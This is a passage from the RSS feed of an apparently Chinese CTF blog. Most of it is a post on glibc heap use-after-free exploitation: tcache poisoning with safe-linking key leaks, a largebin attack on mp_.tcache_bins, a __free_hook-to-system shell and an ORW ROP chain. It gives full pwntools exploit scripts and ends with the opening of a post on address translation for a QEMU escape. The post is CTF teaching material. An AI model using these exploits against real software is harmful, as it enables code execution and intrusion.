<a class="sourceLine" id="cb5-43" title="43">add(<span class="bn">0x500</span>,<span class="st">&quot;0000&quot;</span>) <span class="co">#0</span></a>
<a class="sourceLine" id="cb5-44" title="44">add(<span class="bn">0x70</span>,<span class="st">&quot;1111&quot;</span>) <span class="co">#1</span></a>
<a class="sourceLine" id="cb5-45" title="45">add(<span class="bn">0x70</span>,<span class="st">&quot;2222&quot;</span>) <span class="co">#2</span></a>
<a class="sourceLine" id="cb5-46" title="46">add(<span class="bn">0x70</span>,<span class="st">&quot;3333&quot;</span>) <span class="co">#3</span></a>
<a class="sourceLine" id="cb5-47" title="47"></a>
<a class="sourceLine" id="cb5-48" title="48"></a>
<a class="sourceLine" id="cb5-49" title="49">delete(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb5-50" title="50">show(<span class="dv">0</span>) <span class="co"># leak libc</span></a>
<a class="sourceLine" id="cb5-51" title="51">p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb5-52" title="52">libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="dv">96</span><span class="op">-</span>libc.sym[<span class="st">&#39;__malloc_hook&#39;</span>]<span class="op">-</span><span class="bn">0x10</span></a>
<a class="sourceLine" id="cb5-53" title="53"><span class="bu">print</span> <span class="bu">hex</span>(libc.address)</a>
<a class="sourceLine" id="cb5-54" title="54">delete(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb5-55" title="55">show(<span class="dv">1</span>) <span class="co"># leak heap &amp; key</span></a>
<a class="sourceLine" id="cb5-56" title="56">p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb5-57" title="57">heap_base <span class="op">=</span> (u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">&lt;&lt;</span><span class="dv">12</span>)<span class="op">-</span><span class="bn">0x1000</span></a>
<a class="sourceLine" id="cb5-58" title="58"><span class="bu">print</span> <span class="bu">hex</span>(heap_base)</a>
<a class="sourceLine" id="cb5-59" title="59">delete(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb5-60" title="60">key <span class="op">=</span> (heap_base<span class="op">+</span><span class="bn">0x1840</span>)<span class="op">&gt;&gt;</span><span class="dv">12</span></a>
<a class="sourceLine" id="cb5-61" title="61">fd <span class="op">=</span> key<span class="op">^</span>libc.sym[<span class="st">&#39;__free_hook&#39;</span>]</a>
<a class="sourceLine" id="cb5-62" title="62">edit(<span class="dv">2</span>,p64(fd)<span class="op">+</span>p64(<span class="dv">0</span>))</a>
<a class="sourceLine" id="cb5-63" title="63"></a>
<a class="sourceLine" id="cb5-64" title="64">magic <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x14d09a</span></a>
<a class="sourceLine" id="cb5-65" title="65">setcontext <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x529ad</span></a>
<a class="sourceLine" id="cb5-66" title="66">leave_ret <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x5525c</span></a>
<a class="sourceLine" id="cb5-67" title="67">heap <span class="op">=</span> heap_base<span class="op">+</span><span class="bn">0x1940</span></a>
<a class="sourceLine" id="cb5-68" title="68">rop_addr <span class="op">=</span> heap<span class="op">+</span><span class="bn">0xb0</span></a>
<a class="sourceLine" id="cb5-69" title="69"></a>
<a class="sourceLine" id="cb5-70" title="70">pop_rdi <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x0000000000028a55</span></a>
<a class="sourceLine" id="cb5-71" title="71">pop_rsi <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x000000000002a4cf</span></a>
<a class="sourceLine" id="cb5-72" title="72">pop_rdx <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x00000000000c7f32</span></a>
<a class="sourceLine" id="cb5-73" title="73">pop_rax <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x0000000000044c70</span></a>
<a class="sourceLine" id="cb5-74" title="74">syscall <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x000000000006105a</span></a>
<a class="sourceLine" id="cb5-75" title="75">pop2 <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x000000000018e4ba</span></a>
<a class="sourceLine" id="cb5-76" title="76"></a>
<a class="sourceLine" id="cb5-77" title="77">rop <span class="op">=</span> p64(pop_rdi)</a>
<a class="sourceLine" id="cb5-78" title="78">rop <span class="op">+=</span>p64(heap)</a>
<a class="sourceLine" id="cb5-79" title="79">rop <span class="op">+=</span>p64(pop_rsi)</a>
<a class="sourceLine" id="cb5-80" title="80">rop <span class="op">+=</span>p64(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb5-81" title="81">rop <span class="op">+=</span>p64(pop_rdx)</a>
<a class="sourceLine" id="cb5-82" title="82">rop <span class="op">+=</span>p64(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb5-83" title="83">rop <span class="op">+=</span>p64(pop_rax)</a>
<a class="sourceLine" id="cb5-84" title="84">rop <span class="op">+=</span>p64(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb5-85" title="85">rop <span class="op">+=</span>p64(syscall)</a>
<a class="sourceLine" id="cb5-86" title="86"></a>
<a class="sourceLine" id="cb5-87" title="87">rop <span class="op">+=</span>p64(pop_rdi)</a>
<a class="sourceLine" id="cb5-88" title="88">rop <span class="op">+=</span>p64(<span class="dv">3</span>)</a>
<a class="sourceLine" id="cb5-89" title="89">rop <span class="op">+=</span>p64(pop_rsi)</a>
<a class="sourceLine" id="cb5-90" title="90">rop <span class="op">+=</span>p64(heap<span class="bn">-0x30</span>)</a>
<a class="sourceLine" id="cb5-91" title="91">rop <span class="op">+=</span>p64(pop_rdx)</a>
<a class="sourceLine" id="cb5-92" title="92">rop <span class="op">+=</span>p64(<span class="bn">0x30</span>)</a>
<a class="sourceLine" id="cb5-93" title="93">rop <span class="op">+=</span>p64(pop_rax)</a>
<a class="sourceLine" id="cb5-94" title="94">rop <span class="op">+=</span>p64(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb5-95" title="95">rop <span class="op">+=</span>p64(syscall)</a>
<a class="sourceLine" id="cb5-96" title="96"></a>
<a class="sourceLine" id="cb5-97" title="97">rop <span class="op">+=</span>p64(pop_rdi)</a>
<a class="sourceLine" id="cb5-98" title="98">rop <span class="op">+=</span>p64(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb5-99" title="99">rop <span class="op">+=</span>p64(pop_rax)</a>
<a class="sourceLine" id="cb5-100" title="100">rop <span class="op">+=</span>p64(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb5-101" title="101">rop <span class="op">+=</span>p64(syscall)</a>
<a class="sourceLine" id="cb5-102" title="102"></a>
<a class="sourceLine" id="cb5-103" title="103">add(<span class="bn">0x600</span>,<span class="st">&quot;./flag</span><span class="ch">\x00\x00</span><span class="st">&quot;</span><span class="op">+</span>p64(pop2)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(heap)<span class="op">+</span>p64(pop_rdi)<span class="op">+</span>p64(leave_ret)<span class="op">+</span>rop) <span class="co">#4</span></a>
<a class="sourceLine" id="cb5-104" title="104">add(<span class="bn">0x70</span>,p64(<span class="dv">0</span>)<span class="op">*</span><span class="dv">9</span><span class="op">+</span>p64(heap)) <span class="co">#5</span></a>
<a class="sourceLine" id="cb5-105" title="105"></a>
<a class="sourceLine" id="cb5-106" title="106">add(<span class="bn">0x70</span>,p64(magic)) <span class="co">#6</span></a>
<a class="sourceLine" id="cb5-107" title="107"></a>
<a class="sourceLine" id="cb5-108" title="108"><span class="bu">print</span> <span class="bu">hex</span>(magic)</a>
<a class="sourceLine" id="cb5-109" title="109"></a>
<a class="sourceLine" id="cb5-110" title="110">debug(p)</a>
<a class="sourceLine" id="cb5-111" title="111"></a>
<a class="sourceLine" id="cb5-112" title="112">delete(<span class="dv">5</span>)</a>
<a class="sourceLine" id="cb5-113" title="113"><span class="co"># debug(p)</span></a>
<a class="sourceLine" id="cb5-114" title="114">p.interactive()</a>
<a class="sourceLine" id="cb5-115" title="115"></a>
<a class="sourceLine" id="cb5-116" title="116"><span class="co">&#39;&#39;&#39;</span></a>
<a class="sourceLine" id="cb5-117" title="117"><span class="co">0x000000000014d09a: mov rbp, qword ptr [rdi + 0x48]; mov rax, qword ptr [rbp + 0x18]; lea r13, [rbp + 0x10]; mov dword ptr [rbp + 0x10], 0; mov rdi, r13; call qword ptr [rax + 0x28]; </span></a>
<a class="sourceLine" id="cb5-118" title="118"><span class="co">&#39;&#39;&#39;</span></a></code></pre></div>
<h2 id="x02-只有小堆块的uaf">0x02 只有小堆块的UAF</h2>
<p>同样由于存在UAF，可以先利用UAF堆叠构造大堆块来泄露libc，之后同上操作。</p>
<p>简单来说可以利用tcache的UAF来在heap上申请出另一个堆来修改其他堆的size进行堆风水。</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb6-1" title="1"><span class="co"># -*- coding: utf-8 -*-</span></a>
<a class="sourceLine" id="cb6-2" title="2"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
<a class="sourceLine" id="cb6-3" title="3">context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb6-4" title="4">context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></a>
<a class="sourceLine" id="cb6-5" title="5">libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</a>
<a class="sourceLine" id="cb6-6" title="6">elf <span class="op">=</span> ELF(<span class="st">&quot;./pwn&quot;</span>)</a>
<a class="sourceLine" id="cb6-7" title="7"></a>
<a class="sourceLine" id="cb6-8" title="8">local <span class="op">=</span> <span class="dv">1</span></a>
<a class="sourceLine" id="cb6-9" title="9"></a>
<a class="sourceLine" id="cb6-10" title="10"><span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb6-11" title="11">    p <span class="op">=</span> process(<span class="st">&quot;./pwn&quot;</span>)    </a>
<a class="sourceLine" id="cb6-12" title="12"><span class="cf">else</span>:</a>
<a class="sourceLine" id="cb6-13" title="13">    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</a>
<a class="sourceLine" id="cb6-14" title="14"></a>
<a class="sourceLine" id="cb6-15" title="15"><span class="kw">def</span> debug(p):</a>
<a class="sourceLine" id="cb6-16" title="16">    <span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb6-17" title="17">        gdb.attach(p)</a>
<a class="sourceLine" id="cb6-18" title="18">    <span class="cf">else</span>:</a>
<a class="sourceLine" id="cb6-19" title="19">        <span class="cf">pass</span></a>
<a class="sourceLine" id="cb6-20" title="20"></a>
<a class="sourceLine" id="cb6-21" title="21"><span class="kw">def</span> cmd(i):</a>
<a class="sourceLine" id="cb6-22" title="22">    p.sendlineafter(<span class="st">&quot;choice:&quot;</span>,<span class="bu">str</span>(i))</a>
<a class="sourceLine" id="cb6-23" title="23"></a>
<a class="sourceLine" id="cb6-24" title="24"><span class="kw">def</span> add(size,data):</a>
<a class="sourceLine" id="cb6-25" title="25">    cmd(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb6-26" title="26">    p.sendlineafter(<span class="st">&quot;Size:&quot;</span>,<span class="bu">str</span>(size))</a>
<a class="sourceLine" id="cb6-27" title="27">    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</a>
<a class="sourceLine" id="cb6-28" title="28"></a>
<a class="sourceLine" id="cb6-29" title="29"><span class="kw">def</span> show(idx):</a>
<a class="sourceLine" id="cb6-30" title="30">    cmd(<span class="dv">4</span>)</a>
<a class="sourceLine" id="cb6-31" title="31">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb6-32" title="32"></a>
<a class="sourceLine" id="cb6-33" title="33"><span class="kw">def</span> delete(idx):</a>
<a class="sourceLine" id="cb6-34" title="34">    cmd(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb6-35" title="35">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb6-36" title="36"></a>
<a class="sourceLine" id="cb6-37" title="37"><span class="kw">def</span> edit(idx,data):</a>
<a class="sourceLine" id="cb6-38" title="38">    cmd(<span class="dv">3</span>)</a>
<a class="sourceLine" id="cb6-39" title="39">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb6-40" title="40">    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</a>
<a class="sourceLine" id="cb6-41" title="41"></a>
<a class="sourceLine" id="cb6-42" title="42">add(<span class="bn">0x78</span>,<span class="st">&quot;0000&quot;</span>) <span class="co">#0</span></a>
<a class="sourceLine" id="cb6-43" title="43">add(<span class="bn">0x78</span>,<span class="st">&quot;1111&quot;</span>) <span class="co">#1</span></a>
<a class="sourceLine" id="cb6-44" title="44">add(<span class="bn">0x78</span>,<span class="st">&quot;2222&quot;</span>) <span class="co">#2</span></a>
<a class="sourceLine" id="cb6-45" title="45">add(<span class="bn">0x78</span>,<span class="st">&quot;3333&quot;</span>) <span class="co">#3</span></a>
<a class="sourceLine" id="cb6-46" title="46">add(<span class="bn">0x78</span>,<span class="st">&quot;4444&quot;</span>) <span class="co">#4</span></a>
<a class="sourceLine" id="cb6-47" title="47">add(<span class="bn">0x78</span>,<span class="st">&quot;5555&quot;</span>) <span class="co">#5</span></a>
<a class="sourceLine" id="cb6-48" title="48">add(<span class="bn">0x78</span>,<span class="st">&quot;6666&quot;</span>) <span class="co">#6</span></a>
<a class="sourceLine" id="cb6-49" title="49">add(<span class="bn">0x78</span>,<span class="st">&quot;7777&quot;</span>) <span class="co">#7</span></a>
<a class="sourceLine" id="cb6-50" title="50">add(<span class="bn">0x78</span>,<span class="st">&quot;8888&quot;</span>) <span class="co">#8</span></a>
<a class="sourceLine" id="cb6-51" title="51">add(<span class="bn">0x78</span>,<span class="st">&quot;9999&quot;</span>) <span class="co">#9</span></a>
<a class="sourceLine" id="cb6-52" title="52">add(<span class="bn">0x78</span>,<span class="st">&quot;aaaa&quot;</span>) <span class="co">#10</span></a>
<a class="sourceLine" id="cb6-53" title="53">add(<span class="bn">0x78</span>,<span class="st">&quot;bbbb&quot;</span>) <span class="co">#11</span></a>
<a class="sourceLine" id="cb6-54" title="54">add(<span class="bn">0x78</span>,<span class="st">&quot;cccc&quot;</span>) <span class="co">#12</span></a>
<a class="sourceLine" id="cb6-55" title="55"></a>
<a class="sourceLine" id="cb6-56" title="56">delete(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb6-57" title="57">show(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb6-58" title="58">p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb6-59" title="59">heap_base <span class="op">=</span> (u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">&lt;&lt;</span><span class="dv">12</span>)<span class="op">-</span><span class="bn">0x1000</span></a>
<a class="sourceLine" id="cb6-60" title="60"><span class="bu">print</span> <span class="bu">hex</span>(heap_base)</a>
<a class="sourceLine" id="cb6-61" title="61">delete(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb6-62" title="62">fd <span class="op">=</span> ((heap_base<span class="op">+</span><span class="bn">0x1000</span>)<span class="op">&gt;&gt;</span><span class="dv">12</span>)<span class="op">^</span>(heap_base<span class="op">+</span><span class="bn">0x1390</span>)</a>
<a class="sourceLine" id="cb6-63" title="63">edit(<span class="dv">1</span>,p64(fd)<span class="op">+</span>p64(<span class="dv">0</span>))</a>
<a class="sourceLine" id="cb6-64" title="64"></a>
<a class="sourceLine" id="cb6-65" title="65">add(<span class="bn">0x78</span>,<span class="st">&quot;dddd&quot;</span>) <span class="co">#13</span></a>
<a class="sourceLine" id="cb6-66" title="66">add(<span class="bn">0x78</span>,p64(<span class="dv">0</span>)<span class="op">*</span><span class="dv">3</span><span class="op">+</span>p64(<span class="bn">0x481</span>)) <span class="co">#14</span></a>
<a class="sourceLine" id="cb6-67" title="67">delete(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb6-68" title="68">show(<span class="dv">2</span>) <span class="co"># leak libc</span></a>
<a class="sourceLine" id="cb6-69" title="69">p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb6-70" title="70">libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span>libc.sym[<span class="st">&#39;__malloc_hook&#39;</span>]<span class="op">-</span><span class="dv">96</span><span class="bn">-0x10</span></a>
<a class="sourceLine" id="cb6-71" title="71"><span class="bu">print</span> <span class="bu">hex</span>(libc.address)</a>
<a class="sourceLine" id="cb6-72" title="72"></a>
<a class="sourceLine" id="cb6-73" title="73">delete(<span class="dv">4</span>)</a>
<a class="sourceLine" id="cb6-74" title="74">delete(<span class="dv">5</span>)</a>
<a class="sourceLine" id="cb6-75" title="75">fd <span class="op">=</span> ((heap_base<span class="op">+</span><span class="bn">0x1530</span>)<span class="op">&gt;&gt;</span><span class="dv">12</span>)<span class="op">^</span>(libc.sym[<span class="st">&#39;__free_hook&#39;</span>])</a>
<a class="sourceLine" id="cb6-76" title="76">edit(<span class="dv">5</span>,p64(fd))</a>
<a class="sourceLine" id="cb6-77" title="77">add(<span class="bn">0x78</span>,<span class="st">&quot;/bin/sh</span><span class="ch">\x00</span><span class="st">&quot;</span>) <span class="co">#15</span></a>
<a class="sourceLine" id="cb6-78" title="78">add(<span class="bn">0x78</span>,p64(libc.sym[<span class="st">&#39;system&#39;</span>])) <span class="co">#16</span></a>
<a class="sourceLine" id="cb6-79" title="79"></a>
<a class="sourceLine" id="cb6-80" title="80">delete(<span class="dv">15</span>)</a>
<a class="sourceLine" id="cb6-81" title="81"></a>
<a class="sourceLine" id="cb6-82" title="82"><span class="co"># debug(p)</span></a>
<a class="sourceLine" id="cb6-83" title="83">p.interactive()</a></code></pre></div>
<blockquote>
<p>同样如果开启seccomp沙盒只能ORW，方法参考0x01，只是一个堆块一般可能写不下rop，可以考虑调用sysread或者多个堆块拼凑</p>
</blockquote>
<h2 id="x03-只有大堆块的uaf">0x03 只有大堆块的UAF</h2>
<p>这个比较好玩，我的主要思路就是LargebinAttack修改mp_.tcache_bins来改大对tcache大小范围的判断，之后还是打hook一把梭。</p>
<p>LargebinAttack简单来说就是首先构造下面的堆布局</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb7-1" title="1">add(<span class="bn">0x428</span>)<span class="co">#0</span></a>
<a class="sourceLine" id="cb7-2" title="2">add(<span class="bn">0x408</span>)<span class="co">#1</span></a>
<a class="sourceLine" id="cb7-3" title="3">add(<span class="bn">0x418</span>)<span class="co">#2</span></a>
<a class="sourceLine" id="cb7-4" title="4">add(<span class="bn">0x408</span>)<span class="co">#3</span></a></code></pre></div>
<p>其中chunk1和chunk3只是为了隔开chunk0和chunk2</p>
<p>之后释放chunk0并申请一个更大的chunk让chunk0进入largebin,然后再释放chunk2</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb8-1" title="1">delete(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb8-2" title="2">add(<span class="bn">0x438</span>)<span class="co">#4</span></a>
<a class="sourceLine" id="cb8-3" title="3">delete(<span class="dv">2</span>)</a></code></pre></div>
<p>之后修改chunk0的bk_nextsize为&amp;target-0x20，再申请一个大chunk即可实现修改&amp;target</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb9-1" title="1">add(<span class="bn">0x438</span>)<span class="co">#5</span></a></code></pre></div>
<p><strong>mp_.tcache_bins</strong>中保存了最大tcache的size值，默认是0x80，修改它可以让大chunk都进入tcache。</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb10-1" title="1"><span class="co"># -*- coding: utf-8 -*-</span></a>
<a class="sourceLine" id="cb10-2" title="2"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
<a class="sourceLine" id="cb10-3" title="3">context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb10-4" title="4">context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></a>
<a class="sourceLine" id="cb10-5" title="5">libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</a>
<a class="sourceLine" id="cb10-6" title="6">elf <span class="op">=</span> ELF(<span class="st">&quot;./pwn&quot;</span>)</a>
<a class="sourceLine" id="cb10-7" title="7"></a>
<a class="sourceLine" id="cb10-8" title="8">local <span class="op">=</span> <span class="dv">1</span></a>
<a class="sourceLine" id="cb10-9" title="9"></a>
<a class="sourceLine" id="cb10-10" title="10"><span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb10-11" title="11">    p <span class="op">=</span> process(<span class="st">&quot;./pwn&quot;</span>)    </a>
<a class="sourceLine" id="cb10-12" title="12"><span class="cf">else</span>:</a>
<a class="sourceLine" id="cb10-13" title="13">    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</a>
<a class="sourceLine" id="cb10-14" title="14"></a>
<a class="sourceLine" id="cb10-15" title="15"><span class="kw">def</span> debug(p):</a>
<a class="sourceLine" id="cb10-16" title="16">    <span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb10-17" title="17">        gdb.attach(p)</a>
<a class="sourceLine" id="cb10-18" title="18">    <span class="cf">else</span>:</a>
<a class="sourceLine" id="cb10-19" title="19">        <span class="cf">pass</span></a>
<a class="sourceLine" id="cb10-20" title="20"></a>
<a class="sourceLine" id="cb10-21" title="21"><span class="kw">def</span> cmd(i):</a>
<a class="sourceLine" id="cb10-22" title="22">    p.sendlineafter(<span class="st">&quot;choice:&quot;</span>,<span class="bu">str</span>(i))</a>
<a class="sourceLine" id="cb10-23" title="23"></a>
<a class="sourceLine" id="cb10-24" title="24"><span class="kw">def</span> add(size,data<span class="op">=</span><span class="st">&quot;&quot;</span>):</a>
<a class="sourceLine" id="cb10-25" title="25">    cmd(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb10-26" title="26">    p.sendlineafter(<span class="st">&quot;Size:&quot;</span>,<span class="bu">str</span>(size))</a>
<a class="sourceLine" id="cb10-27" title="27">    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</a>
<a class="sourceLine" id="cb10-28" title="28"></a>
<a class="sourceLine" id="cb10-29" title="29"><span class="kw">def</span> show(idx):</a>
<a class="sourceLine" id="cb10-30" title="30">    cmd(<span class="dv">4</span>)</a>
<a class="sourceLine" id="cb10-31" title="31">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb10-32" title="32"></a>
<a class="sourceLine" id="cb10-33" title="33"><span class="kw">def</span> delete(idx):</a>
<a class="sourceLine" id="cb10-34" title="34">    cmd(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb10-35" title="35">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb10-36" title="36"></a>
<a class="sourceLine" id="cb10-37" title="37"><span class="kw">def</span> edit(idx,data):</a>
<a class="sourceLine" id="cb10-38" title="38">    cmd(<span class="dv">3</span>)</a>
<a class="sourceLine" id="cb10-39" title="39">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb10-40" title="40">    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</a>
<a class="sourceLine" id="cb10-41" title="41"></a>
<a class="sourceLine" id="cb10-42" title="42">add(<span class="bn">0x428</span>)<span class="co">#0</span></a>
<a class="sourceLine" id="cb10-43" title="43">add(<span class="bn">0x408</span>)<span class="co">#1</span></a>
<a class="sourceLine" id="cb10-44" title="44">add(<span class="bn">0x418</span>)<span class="co">#2</span></a>
<a class="sourceLine" id="cb10-45" title="45">add(<span class="bn">0x408</span>)<span class="co">#3</span></a>
<a class="sourceLine" id="cb10-46" title="46">delete(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb10-47" title="47">show(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb10-48" title="48">p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb10-49" title="49">libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span>libc.sym[<span class="st">&#39;__malloc_hook&#39;</span>]<span class="op">-</span><span class="bn">0x10</span><span class="dv">-96</span></a>
<a class="sourceLine" id="cb10-50" title="50"><span class="bu">print</span> <span class="bu">hex</span>(libc.address)</a>
<a class="sourceLine" id="cb10-51" title="51">add(<span class="bn">0x438</span>)<span class="co">#4</span></a>
<a class="sourceLine" id="cb10-52" title="52">delete(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb10-53" title="53">mp_tcache_bins <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x1e02d0</span> <span class="co"># mp_.tcache_bins</span></a>
<a class="sourceLine" id="cb10-54" title="54">edit(<span class="dv">0</span>,p64(<span class="dv">0</span>)<span class="op">*</span><span class="dv">3</span><span class="op">+</span>p64(mp_tcache_bins<span class="bn">-0x20</span>))</a>
<a class="sourceLine" id="cb10-55" title="55">add(<span class="bn">0x438</span>)<span class="co">#5</span></a>
<a class="sourceLine" id="cb10-56" title="56"></a>
<a class="sourceLine" id="cb10-57" title="57">delete(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb10-58" title="58">show(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb10-59" title="59">p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb10-60" title="60">key <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))</a>
<a class="sourceLine" id="cb10-61" title="61"><span class="bu">print</span> <span class="bu">hex</span>(key)</a>
<a class="sourceLine" id="cb10-62" title="62">delete(<span class="dv">3</span>)</a>
<a class="sourceLine" id="cb10-63" title="63">edit(<span class="dv">3</span>,p64(libc.sym[<span class="st">&#39;__free_hook&#39;</span>]<span class="op">^</span>key))</a>
<a class="sourceLine" id="cb10-64" title="64">add(<span class="bn">0x408</span>,<span class="st">&quot;/bin/sh</span><span class="ch">\x00</span><span class="st">&quot;</span>)<span class="co">#6</span></a>
<a class="sourceLine" id="cb10-65" title="65">add(<span class="bn">0x408</span>,p64(libc.sym[<span class="st">&#39;system&#39;</span>]))<span class="co">#7</span></a>
<a class="sourceLine" id="cb10-66" title="66">delete(<span class="dv">6</span>)</a>
<a class="sourceLine" id="cb10-67" title="67"></a>
<a class="sourceLine" id="cb10-68" title="68"><span class="co"># debug(p)</span></a>
<a class="sourceLine" id="cb10-69" title="69">p.interactive()</a></code></pre></div>
<blockquote>
<p>对于ORW 同样参考0x01</p>
</blockquote>]]></description>
    <pubDate>Wed, 23 Nov 2022 15:32:04 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[虚拟地址到物理地址]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/221108-gva2gpa</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/221108-gva2gpa</guid>
    <description><![CDATA[<h1 id="虚拟地址到物理地址">虚拟地址到物理地址</h1>
<h1 id="x00-开始之前">0x00 开始之前</h1>
<p>先前看一个<a href="https://blog.mark0519.com/#/pwnable/221025-qemu-basic?id=_0x02-hws2021-fastcp">qemu逃逸题</a>遇到:</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1">cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="dv">8</span> * v9, &amp;cp_info, <span class="bn">0x18</span><span class="bu">uLL</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-2" title="2">cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-3" title="3">cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="dv">1</span>);</a></code></pre></div>
<p>主要是第一次遇到这个函数：<strong>cpu_physical_memory_rw()</strong></p>
